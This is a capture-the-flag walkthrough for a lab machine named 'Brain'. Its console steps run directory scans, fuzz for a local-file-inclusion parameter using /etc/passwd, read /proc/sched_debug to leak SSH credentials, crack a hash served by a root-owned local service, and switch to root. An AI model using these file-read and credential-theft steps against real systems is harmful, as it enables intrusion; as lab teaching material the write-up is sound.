# Brain walkthrough
## Directory scan
[main path]
```console
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.162/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.txt,.jpg,.html,.bak,.php.bak
/index.html (Status: 200)
/robots.txt (Status: 200)
/brainstorm (Status: 301)
```
[brainstorm path]
```console
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.162/brainstorm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.txt,.jpg,.html,.bak,.php.bak
/index.html (Status: 200)
/image.jpg (Status: 200)
/file.php (Status: 200)
```
## Get parameter 
```console
┌──(alienum㉿kali)-[~]
└─$ wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt   --hh 0  'http://10.0.2.162/brainstorm/file.php?FUZZ=/etc/passwd'
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                          
=====================================================================

000000010:   200        26 L     38 W       1401 Ch     "file"                                           
```
## LFI, fuzzing files
```console
┌──(alienum㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/tutorial0/payloads/master/lfi.txt
┌──(alienum㉿kali)-[~]
└─$ wfuzz -w lfi.txt   --hh 0  'http://10.0.2.162/brainstorm/file.php?file=FUZZ'
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                          
=====================================================================                              
000000001:   200        151 L    1130 W     11693 Ch    "/proc/sched_debug"                              

```
## Reading a specific file
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.162/brainstorm/file.php?file=/proc/sched_debug 
 Ssalomon:M*****   382      2236.249707        16   120         0.000000         4.615692         0.000000 0 0 /
```
### SSH login, salomon
## PS AUX
```console
salomon@Brain:~$ ps aux | grep root
root       399  0.0  1.3  22224 13708 ?        S    13:40   0:01 python /root/server.py 127.0.0.1:65000
```
## WGET
```console
salomon@Brain:~$ wget 127.0.0.1:65000
--2021-02-02 14:46:47--  http://127.0.0.1:65000/
Conectando con 127.0.0.1:65000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 192 [text/html]
Grabando a: “index.html”

index.html                                                 100%[=======================================================================================================================================>]     192  --.-KB/s    en 0s      

2021-02-02 14:46:47 (13,6 MB/s) - “index.html” guardado [192/192]

salomon@Brain:~$ cat index.html
[+] You are a great Hacker!! I think you are looking for this:
065BB0B9A0C654E5B3B6292C4698BD67CE6A331209D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6A5626E0CB7521641D742251F5A17167
salomon@Brain:~$
```
## Crackstation
```console
Hash : 065BB0B9A0C654E5B3B6292C4698BD67CE6A331209D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6A5626E0CB7521641D742251F5A17167
Type : sha12
Result : ge****
```
## SU ROOT
```console
salomon@Brain:~$ su root
Contraseña: 
root@Brain:/home/salomon# cd
root@Brain:~# ls
index.html  root.txt  run_server.sh  server.py
root@Brain:~# 
```
